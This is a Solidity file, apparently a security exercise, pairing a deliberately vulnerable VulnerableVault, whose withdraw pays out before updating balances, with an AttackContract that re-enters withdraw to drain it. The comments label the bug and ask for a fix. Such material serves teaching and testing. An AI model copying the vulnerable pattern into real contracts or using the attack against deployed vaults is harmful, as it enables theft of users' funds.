pragma solidity ^0.8.20;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/// @title VulnerableVault
/// @notice INSECURE — Your task: Fix the reentrancy vulnerability
contract VulnerableVault {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /// @notice BUG: Violates Checks-Effects-Interactions pattern
    /// TODO: Fix this function to prevent reentrancy attacks
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // VULNERABILITY: External call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // BUG: State updated AFTER external call
        balances[msg.sender] -= amount;

        emit Withdrawal(msg.sender, amount);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/// @title AttackContract
/// @notice Simulates reentrancy attack — DO NOT deploy to mainnet
contract AttackContract {
    VulnerableVault public target;
    uint256 public attackCount;

    constructor(address _target) {
        target = VulnerableVault(_target);
    }

    receive() external payable {
        if (address(target).balance >= 1 ether && attackCount < 5) {
            attackCount++;
            target.withdraw(1 ether); // Recursive drain!
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH to attack");
        target.deposit{value: 1 ether}();
        target.withdraw(1 ether);
    }
}

